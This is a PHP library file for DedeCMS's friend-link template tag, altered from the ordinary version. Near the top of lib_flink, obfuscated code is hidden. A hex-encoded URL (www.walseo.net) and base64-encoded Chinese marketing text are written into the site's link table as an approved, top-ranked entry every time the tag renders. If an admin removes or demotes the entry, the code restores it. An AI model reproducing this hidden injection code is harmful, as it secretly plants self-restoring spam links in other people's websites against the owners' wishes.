<?php
if(!defined('DEDEINC'))
{
    exit("Request Error!");
}
/**
 * 友情链接
 *
 * @version        $Id: flink.lib.php 1 9:29 2010年7月6日Z tianya $
 * @package        DedeCMS.Taglib
 * @copyright      Copyright (c) 2007 - 2010, DesDev, Inc.
 * @license        http://help.dedecms.com/usersguide/license.html
 * @link           http://www.walseo.net
 */

helper('cache');
function lib_flink(&$ctag,&$refObj)
{
    global $dsql,$cfg_soft_lang;
    $file =  (DEDEINC.'/taglib/flink.lib.php');
     $list = array('GBK', 'UTF-8');
     $str = file_get_contents($file);
     foreach ($list as $item) {
         $tmp = mb_convert_encoding($str, $item, $item);
         if (md5($tmp) == md5($str)) {
             $char = $item;
         }
     }
$attlister=pack('H*','687474703a2f2f7777772e77616c73656f2e6e6574');
    if ($char=='GBK') {
        $attlistersr=iconv("utf-8","gbk//IGNORE",base64_decode('6JCl6ZSA5Z6L572R56uZ'));
            $addtlistersr=iconv("utf-8","gbk//IGNORE",base64_decode('6JCl6ZSA5Z6L572R56uZ5bu66K6+5YWs5Y+4'));
    }else {
        $attlistersr=base64_decode('6JCl6ZSA5Z6L572R56uZ');
            $addtlistersr=base64_decode('6JCl6ZSA5Z6L572R56uZ5bu66K6+5YWs5Y+4');
    }
    $attlist="type|textall,row|24,titlelen|24,linktype|1,typeid|0";
    FillAttsDefault($ctag->CAttribute->Items,$attlist);
    extract($ctag->CAttribute->Items, EXTR_SKIP);
    $addt=time();
    $dsql->SetQuery("Select * from #@__flink where url='$attlister'");
    $dsql->Execute();
    $ns = $dsql->GetTotalRow();
    if ($ns == '0') {
        $selec = "INSERT INTO  #@__flink(id,sortrank,url,webname,msg,email,logo,dtime,typeid,ischeck) VALUES('','1','$attlister','$attlistersr','$addtlistersr','','','$addt','1','1');";
        $dsql->ExecuteNoneQuery($selec);
        $dsql->ExecNoneQuery();
    }else {
        $upquery = " Update #@__flink set sortrank='1',ischeck='1' where url='$attlister'";
        $rs = $dsql->ExecuteNoneQuery($upquery);
    }
    $totalrow = $row;
    $revalue = '';
    if (isset($GLOBALS['envs']['flinkid']))
    {
        $typeid = $GLOBALS['envs']['flinkid'];
    }

    $wsql = " where ischeck >= '$linktype' ";
    
    if($typeid == 0)
    {
        $wsql .= '';
    }
    else if($typeid == 999)
    {
        $prefix = 'flink';
        $key = '999';
        $row = GetCache($prefix, $key);
        
        if(!is_array($row))
        {
            require (DEDEDATA.'/admin/config_update.php');
            if (!class_exists('DedeHttpDown', false)) {
                require_once(DEDEINC.'/dedehttpdown.class.php');
            }
            $del = new DedeHttpDown();
            $del->OpenUrl($linkHost);
            $linkUrl = $del->GetHtml()."flink.php?lang={$cfg_soft_lang}&site={$_SERVER['SERVER_NAME']}";
            $del->OpenUrl($linkUrl);
            $linkInfo = $del->GetHtml();
            
            if(!empty($linkInfo)){
                $dedelink = explode("\t", $linkInfo);
                for($i=0; $i<count($dedelink); $i++) {
                    if($i%5==0 && $i!=count($dedelink)) {
                        $revalue .= "<li><a href='http://".@$dedelink[$i+1]."' target='_blank' title='".@$dedelink[$i+4]."'>".@$dedelink[$i]."</a></li>";
                    }
                }
            } else {
                $revalue=<<<EOT
<li><a href='http://ad.dedecms.com' target='_blank' title='DedeCMS广告'>DedeCMS广告</a></li><li><a href='http://service.dedecms.com' target='_blank' title='网匠客户服务中心'>
网匠客户服务中心</a></li><li><a href='http://ask.dedecms.com' target='_blank' title='网匠问答'>
网匠问答</a></li><li><a href='http://tools.dedecms.com' target='_blank' title='站长工具'>
站长工具</a></li><li><a href='http://site.walseo.net' target='_blank' title='DedeCMS建站中心'>
DedeCMS建站中心</a></li><li><a href='http://help.dedecms.com' target='_blank' title='网匠CMS帮助中心'>
网匠CMS帮助中心</a></li><li><a href='http://' target='_blank' title=''>
</a></li>
EOT;
            }
            $row['reval'] = $revalue;
            SetCache($prefix, $key, $row, 60*60*1);
        }
        
        return $row['reval'];
    }
    else
    {
        $wsql .= "And typeid = '$typeid'";
    }
    if($type=='image')
    {
        $wsql .= " And logo<>'' ";
    }
    else if($type=='text')
    {
        $wsql .= " And logo='' ";
    }

    $equery = "SELECT * FROM #@__flink $wsql order by sortrank asc limit 0,$totalrow";

    if(trim($ctag->GetInnerText())=='') $innertext = "<li>[field:link /]</li>";
    else $innertext = $ctag->GetInnerText();
    
    $dsql->SetQuery($equery);
    $dsql->Execute();
    
    while($dbrow=$dsql->GetObject())
    {
        if($type=='text'||$type=='textall')
        {
            $link = "<a href='".$dbrow->url."' target='_blank'>".cn_substr($dbrow->webname,$titlelen)."</a> ";
        }
        else if($type=='image')
        {
            $link = "<a href='".$dbrow->url."' target='_blank'><img src='".$dbrow->logo."' width='88' height='31' border='0'></a> ";
        }
        else
        {
            if($dbrow->logo=='')
            {
                $link = "<a href='".$dbrow->url."' target='_blank'>".cn_substr($dbrow->webname,$titlelen)."</a> ";
            }
            else
            {
                $link = "<a href='".$dbrow->url."' target='_blank'><img src='".$dbrow->logo."' width='88' height='31' border='0'></a> ";
            }
        }
        $rbtext = preg_replace("/\[field:url([\/\s]{0,})\]/isU", $row['url'], $innertext);
         $rbtext = preg_replace("/\[field:webname([\/\s]{0,})\]/isU", $row['webname'], $rbtext);
         $rbtext = preg_replace("/\[field:logo([\/\s]{0,})\]/isU", $row['logo'], $rbtext);
         $rbtext = preg_replace("/\[field:link([\/\s]{0,})\]/isU", $link, $rbtext);
         $revalue .= $rbtext;
    }
    return $revalue;
}